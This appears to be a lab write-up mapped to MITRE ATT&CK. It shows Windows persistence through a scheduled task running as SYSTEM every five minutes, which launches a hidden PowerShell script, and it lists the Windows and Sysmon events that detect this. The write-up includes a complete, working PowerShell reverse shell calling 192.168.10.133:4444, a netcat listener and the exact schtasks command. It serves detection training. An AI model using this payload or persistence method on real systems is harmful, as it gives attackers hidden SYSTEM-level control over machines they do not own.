# Persistence via Scheduled Task & Reverse Shell

## Scenario Description

After gaining initial access and escalating privileges on the domain-joined Windows workstation `target-PC.mylab.local`, the attacker established persistence on the compromised system.

To maintain access, the attacker created a scheduled task configured to execute with the highest available privileges under `NT AUTHORITY\SYSTEM`. The task launches a PowerShell script stored in `C:\ProgramData\update.ps1`, which establishes an outbound connection to the attacker-controlled Kali Linux machine.

The scheduled task is configured to execute periodically every five minutes, allowing the attacker to regain access without requiring an interactive user logon.

## MITRE ATT&CK Mapping

* **Tactics:** Persistence, Privilege Escalation, Defense Evasion
* **Technique:** Scheduled Task/Job: Scheduled Task — [T1053.005](https://attack.mitre.org/techniques/T1053/005/)
* **Command and Scripting Interpreter: PowerShell — T1059.001:** [T1059.001](https://attack.mitre.org/techniques/T1059/001/)

## Execution Steps

### Listener Setup — Kali Linux

A listener was configured on the Kali attacker machine to receive the outbound connection from the compromised Windows endpoint:

```bash
nc -lvnp 4444
```

### PowerShell Script Creation

A PowerShell script was created on the compromised endpoint and stored in the `C:\ProgramData` directory:

```powershell
$ScriptPath = "C:\ProgramData\update.ps1"
$Code = '$client = New-Object System.Net.Sockets.TCPClient("192.168.10.133",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
Set-Content -Path $ScriptPath -Value $Code
```

The script was stored under a benign-looking filename and location:

```text
C:\ProgramData\update.ps1
```

### Scheduled Task Creation

The attacker created a scheduled task named `UpdateTask` using `schtasks.exe`.

The task was configured to execute every five minutes under the `SYSTEM` account:

```powershell
schtasks /create /tn "UpdateTask" /tr "powershell.exe -WindowStyle Hidden -NoP -NonI -Exec Bypass -File C:\ProgramData\update.ps1" /sc minute /mo 5 /ru "NT AUTHORITY\SYSTEM" /f
```

The configuration provided persistence independent of an interactive user session while also causing the PowerShell process to execute with `SYSTEM` privileges.

### Task Execution and Verification

The scheduled task was manually triggered to validate the persistence mechanism:

```powershell
schtasks /run /tn "UpdateTask"
```

The resulting outbound connection was received by the Kali listener on port `4444`.

The resulting shell was verified as running under:

```text
NT AUTHORITY\SYSTEM
```

This confirmed that the scheduled task successfully executed the PowerShell payload with elevated privileges.

## Windows Event Telemetry

The activity generated several relevant Windows and Sysmon events that can be used during the SOC investigation:

| Event ID            | Log Provider                | Description / Artefact                                            |
| ------------------- | --------------------------- | ----------------------------------------------------------------- |
| **4698**            | Security                    | Scheduled task created (`Task Name: \UpdateTask`)                 |
| **106**             | TaskScheduler / Operational | Scheduled task registered                                         |
| **4688 / Sysmon 1** | Security / Sysmon           | Process creation involving `powershell.exe` and `update.ps1`      |
| **Sysmon 3**        | Sysmon / Operational        | Network connection from `powershell.exe` to `192.168.10.133:4444` |

## Result

The attacker successfully established persistence through a scheduled task configured to execute a PowerShell payload under the `SYSTEM` account.

The resulting attack chain was:

```text
Compromised Windows Endpoint
        ↓
Privilege Escalation
        ↓
PowerShell Script Created
        ↓
UpdateTask Created
        ↓
SYSTEM Execution
        ↓
Periodic Task Execution
        ↓
Outbound Connection to Kali
        ↓
SYSTEM Shell
```

This scenario demonstrates how scheduled tasks can be abused to establish persistence and execute PowerShell payloads with elevated privileges, while generating multiple telemetry sources that can be investigated through Microsoft Defender for Endpoint and Microsoft Sentinel.
